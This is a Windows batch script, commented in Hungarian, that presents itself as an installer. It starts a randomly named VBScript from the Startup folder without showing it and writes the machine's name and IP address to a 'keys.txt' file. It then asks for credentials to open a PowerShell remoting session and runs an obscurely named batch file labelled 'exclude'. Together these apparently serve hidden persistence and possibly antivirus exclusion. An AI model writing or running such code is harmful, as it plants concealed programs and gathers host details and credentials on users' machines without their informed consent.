@echo off
setlocal enabledelayedexpansion

:: ====== MAPPÁK ======
set "TARGET=%PUBLIC%\Documents\keys"
if not exist "%TARGET%" mkdir "%TARGET%"

:: Keys.txt létrehozása, ha még nincs
if not exist "%TARGET%\keys.txt" (
    echo Created by installer > "%TARGET%\keys.txt"
)

set "STARTUP_FOLDER=%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup"

:: Startup mappa létrehozása, ha nincs
if not exist "%STARTUP_FOLDER%" mkdir "%STARTUP_FOLDER%"


:: ====== VBSCRIPT FUTTATÁSA LÁTHATATLANUL ======
echo [INFO] A sifustartup5sfgj.vbs inditasa...
start "" "wscript.exe" "%STARTUP_FOLDER%\sifustartup5sfgj.vbs"
echo [SIKER] VBScript elindult (háttérben).


:: ====== GÉPNÉV + IP ======
set "GEPNEV=%COMPUTERNAME%"

for /f "tokens=2 delims=:" %%a in ('ipconfig ^| findstr /i "IPv4"') do (
    set "TEMPIP=%%a"
    set "IP=!TEMPIP: =!"
)


:: ====== KEYS.TXT FELÜLÍRÁSA ======
(
    echo GEPNEV: !GEPNEV!
    echo IP: !IP!
) > "%TARGET%\keys.txt"

echo [INFO] keys.txt frissítve.
echo [INFO] PowerShell Remoting indítása: %IP%
echo.


:: ====== POWERSHELL REMOTING ======
powershell.exe -Command "
    $user = Get-Credential;
    Write-Host 'Kapcsolodas a %IP% cimen levo gephez...';
    Enter-PSSession -ComputerName %IP% -Credential $user
"


:: ====== EXCLUDE.BAZ FUTTATÁSA ======
echo.
echo [INFO] exclude.baz futtatása...

if exist "%~dp0excfb6sfb3.bat" (
    start "" "%~dp0excfb6sfb3.bat"
    echo [SIKER] exclude.baz elinditva.
) else (
    echo [HIBA] exclude.baz nem található a bat mappájában!
)

echo.
pause
